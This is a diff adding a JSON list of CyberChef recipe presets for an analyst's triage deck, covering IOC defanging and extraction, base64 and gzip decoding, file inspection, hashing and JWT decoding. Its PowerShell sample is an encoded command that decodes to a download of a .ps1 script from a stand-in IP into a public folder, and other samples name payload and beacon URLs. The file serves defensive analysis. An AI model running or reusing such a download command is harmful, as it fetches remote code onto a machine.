@@ -1,0 +1,192 @@
+{
+  "schema": 1,
+  "decision": "DEC-PHASE12-043",
+  "note": "Each recipe is the URL-fragment form CyberChef already understands. No CyberChef file is patched to add them, which is why the vendored build still matches its upstream checksum. Operation names are checked against the shipped build by tests/unit/test_osint_surface.sh.",
+  "cyberchef_version": "11.5.0",
+  "recipes": [
+    {
+      "id": "magic",
+      "name": "What is this?",
+      "group": "triage",
+      "recipe": "Magic()",
+      "input": "H4sIAAAAAAAC/8soKSmw0tfPTczJTM7MLy3WS61IzC3ISdXLSy3RL0iszMlPTNFLyszjAgCh3lsjKQAAAA==",
+      "why": "CyberChef's own detector walks the decode tree and tells you what the data probably is. Start here when you do not know what you are holding."
+    },
+    {
+      "id": "defang",
+      "name": "Defang IOCs for a report",
+      "group": "ioc",
+      "recipe": "Defang_URL()Defang_IP_Addresses()",
+      "input": "http://malicious.example.net/payload.bin  203.0.113.45  https://evil.example.org:8080/a",
+      "why": "Turn live indicators into something you can paste into a ticket, an email or a chat without anyone's client turning it into a clickable link."
+    },
+    {
+      "id": "refang",
+      "name": "Refang an indicator",
+      "group": "ioc",
+      "recipe": "Fang_URL()",
+      "input": "hxxp://malicious[.]example[.]net/payload[.]bin",
+      "why": "The inverse. Someone sent you a defanged indicator and you need the real string to search for."
+    },
+    {
+      "id": "extract-ips",
+      "name": "Extract IP addresses",
+      "group": "ioc",
+      "recipe": "Extract_IP_addresses()",
+      "input": "Oct  3 13:37:02 orionx kernel: [ORIONX-DROP] SRC=203.0.113.45 DST=192.168.4.42 PROTO=TCP DPT=22\nOct  3 13:37:03 orionx kernel: [ORIONX-DROP] SRC=198.51.100.7 DST=192.168.4.42 PROTO=TCP DPT=445",
+      "why": "Pull every address out of a log paste, then sort/unique them in the next operation."
+    },
+    {
+      "id": "extract-domains",
+      "name": "Extract domains",
+      "group": "ioc",
+      "recipe": "Extract_domains()",
+      "input": "GET /a HTTP/1.1\nHost: cdn.malicious.example.net\nReferer: https://lure.example.org/login",
+      "why": "Domains out of raw HTTP, email headers or a config blob."
+    },
+    {
+      "id": "extract-urls",
+      "name": "Extract URLs",
+      "group": "ioc",
+      "recipe": "Extract_URLs()",
+      "input": "see https://lure.example.org/login and http://198.51.100.7:8080/beacon.php?id=3",
+      "why": "Every URL in a document, in one pass."
+    },
+    {
+      "id": "extract-hashes",
+      "name": "Extract hashes",
+      "group": "ioc",
+      "recipe": "Extract_hashes()",
+      "input": "md5 d41d8cd98f00b204e9800998ecf8427e sha1 da39a3ee5e6b4b0d3255bfef95601890afd80709 sha256 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "why": "Harvest every MD5/SHA1/SHA256 out of a report so you can look them up in bulk."
+    },
+    {
+      "id": "extract-emails",
+      "name": "Extract email addresses",
+      "group": "ioc",
+      "recipe": "Extract_email_addresses()",
+      "input": "From: billing@lure.example.org\nReply-To: collector@mail.example.net",
+      "why": "Addresses out of headers, phishing bodies or a leaked document."
+    },
+    {
+      "id": "b64-gunzip",
+      "name": "Base64 -> Gunzip",
+      "group": "decode",
+      "recipe": "From_Base64()Gunzip()",
+      "input": "H4sIAAAAAAAC/0tKTUzOz9PLTczJTM7MLy3WS61IzC3ISdXLSy3RT08sSdUryCiwz0yxNTExNOcCAJUIQg8uAAAA",
+      "why": "The single most common packing chain in a dropper, a C2 response or a compressed log field."
+    },
+    {
+      "id": "b64-inflate",
+      "name": "Base64 -> Raw Inflate",
+      "group": "decode",
+      "recipe": "From_Base64()Raw_Inflate()",
+      "input": "S0pNTM7P08tNzMlMzswvLdZLrUjMLchJ1ctLLdFPTyxJ1SvIKLDPTLE1MTE05wIA",
+      "why": "Same shape, but raw DEFLATE with no gzip header — what you get from zlib streams and some web payloads."
+    },
+    {
+      "id": "ps-encodedcommand",
+      "name": "PowerShell -EncodedCommand",
+      "group": "decode",
+      "recipe": "From_Base64()Decode_text('UTF-16LE (1200)')",
+      "input": "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4ANwAvAGEALgBwAHMAMQAgAC0ATwB1AHQARgBpAGwAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAYQAuAHAAcwAxAA==",
+      "why": "PowerShell encodes its -EncodedCommand payload as UTF-16LE then base64. Decoding it as UTF-8 gives you text with a null byte between every character, which is how most people get this wrong."
+    },
+    {
+      "id": "hexdump",
+      "name": "Hex dump",
+      "group": "inspect",
+      "recipe": "To_Hexdump()",
+      "input": "MZ\u0000\u0003\u0000\u0000\u0000\u0004\u0000\u0000\u0000ÿÿ\u0000\u0000",
+      "why": "A classic offset/hex/ASCII dump of whatever is in the input pane, including a dropped file."
+    },
+    {
+      "id": "hexdump-gunzip",
+      "name": "Hex dump -> Gunzip",
+      "group": "decode",
+      "recipe": "From_Hexdump()Gunzip()",
+      "input": "",
+      "why": "Someone pasted you a hex dump of a compressed blob. Parse it back to bytes and decompress in one go."
+    },
+    {
+      "id": "strings",
+      "name": "Strings",
+      "group": "inspect",
+      "recipe": "Strings()",
+      "input": "",
+      "why": "Printable runs out of a binary. Drop the file into the input pane; nothing leaves this deck."
+    },
+    {
+      "id": "filetype",
+      "name": "Detect file type + embedded files",
+      "group": "inspect",
+      "recipe": "Detect_File_Type()",
+      "input": "",
+      "why": "Magic-byte identification, for when the extension is a lie."
+    },
+    {
+      "id": "embedded",
+      "name": "Scan for embedded files",
+      "group": "inspect",
+      "recipe": "Scan_for_Embedded_Files()",
+      "input": "",
+      "why": "Finds file signatures *inside* a blob — the office document with a PE in it, the image with an archive appended."
+    },
+    {
+      "id": "entropy",
+      "name": "Entropy",
+      "group": "inspect",
+      "recipe": "Entropy()",
+      "input": "",
+      "why": "High flat entropy means encrypted or compressed. Useful for spotting a packed section or an exfil blob."
+    },
+    {
+      "id": "hashes",
+      "name": "Generate all hashes",
+      "group": "hash",
+      "recipe": "Generate_all_hashes()",
+      "input": "",
+      "why": "Every common digest of the input at once, so you can search whichever one the other tool wants."
+    },
+    {
+      "id": "jwt",
+      "name": "Decode a JWT",
+      "group": "decode",
+      "recipe": "JWT_Decode()",
+      "input": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
+      "why": "Header and claims out of a bearer token you pulled from a capture. Decoding is not verifying."
+    },
+    {
+      "id": "urldecode",
+      "name": "URL decode, then defang",
+      "group": "ioc",
+      "recipe": "URL_Decode()Defang_URL()",
+      "input": "https%3A%2F%2Flure.example.org%2Flogin%3Fnext%3Dhttp%253A%252F%252F198.51.100.7%252Fb",
+      "why": "Nested URL encoding in a redirect chain, unwrapped and then made safe to paste."
+    },
+    {
+      "id": "useragent",
+      "name": "Parse a User-Agent",
+      "group": "inspect",
+      "recipe": "Parse_User_Agent()",
+      "input": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+      "why": "Break a UA string into browser, engine and OS — including the ones that are obviously forged."
+    },
+    {
+      "id": "xor-brute",
+      "name": "XOR brute force",
+      "group": "decode",
+      "recipe": "XOR_Brute_Force()",
+      "input": "",
+      "why": "Single-byte XOR is still the most common 'encryption' in a dropper. This tries every key and shows the printable results."
+    },
+    {
+      "id": "encoding-brute",
+      "name": "Text encoding brute force",
+      "group": "decode",
+      "recipe": "Text_Encoding_Brute_Force()",
+      "input": "",
+      "why": "When text comes out as mojibake, try every codepage and read the one that makes sense."
+    }
+  ]
+}
